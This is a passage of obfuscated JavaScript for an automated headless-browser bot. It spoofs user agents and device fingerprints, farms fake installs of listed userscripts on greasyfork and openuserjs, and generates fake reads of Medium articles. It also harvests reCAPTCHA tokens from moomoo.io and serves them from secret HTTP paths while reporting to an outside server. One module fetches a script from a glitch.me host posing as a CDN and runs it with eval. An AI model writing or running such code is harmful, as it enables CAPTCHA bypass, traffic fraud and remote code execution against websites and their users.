      'preRef': 'https://gr' + Y(0xb, '3JGY') + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + Y(0xd, 'meWM') + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + X(0x0) + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x13) + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0xc) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + X(0x6) + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + Y(0x15, '%(lc') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + Y(0x12, 'W[RL') + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2 * -0x241 + 0x476 * 0x7 + -0x23bc
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1b43 + 0x20ec * -0x1 + -0x3 * -0x1e3)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xe09 + 0x234e + -0x14e1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x77f + -0x1524 + -0xe09 * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x2 * -0x5d1 + 0x104a + 0x2 * -0xdf6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1dbb + -0x2387 + 0x1 * 0x5cc; w < getRandomInt(-0x1 * -0x296 + 0x85c * 0x2 + 0x66f * -0x3, -0x9 * -0x4b + -0x1522 + 0xed * 0x14); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x77e * -0x33 + -0x1b0cd + 0x11d13);
        }
      }();
    }, -0x419 * 0x5 + -0x20a5 * -0x1 + -0xbc4), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1013 * -0x1 + 0x387 + -0x1 * 0x139a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x17 * 0x1b0 + -0x7ee + 0x2ebe, -0xd29 + -0x26d0 + -0x1 * -0x342b)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x519 * 0x22 + -0xe * -0x641 + 0x4 * -0x23ec);
    }, 0x217b + 0x12 * 0x26 + -0x5 * 0x727), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xba5 + 0x26f7 + -0x329c;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x22d0 * -0x1 + -0x17a3 + -0x8b * -0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x8 * 0xa6 + 0x156f + -0x1a9f), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x188386 + -0x1580f2 + 0xab90c);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x202 + -0xd * -0xb9 + -0xb03);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x16d0 + -0x14f6 + -0x112);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process[W(0x17)]['PORT'] || -0x5b * 0x8b + -0x20b9 * -0x1 + 0x3040);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c,
    Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x539 + 0x149a + -0xa4 * 0x18) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x49d * 0x6 + 0x1 * -0x157f + -0x62e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1 * -0x2051 + 0x14d * -0x5 + 0x26d2, D['indexOf']('\x20'));
        return B ? E['slice'](0x4cd + 0xfb9 + -0x1486, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3b1c + -0x43d0 + 0x2fc4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x605 + 0x26ed + 0x628),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      Z(0x9, 'k8sZ') + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + a0(0xa) + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
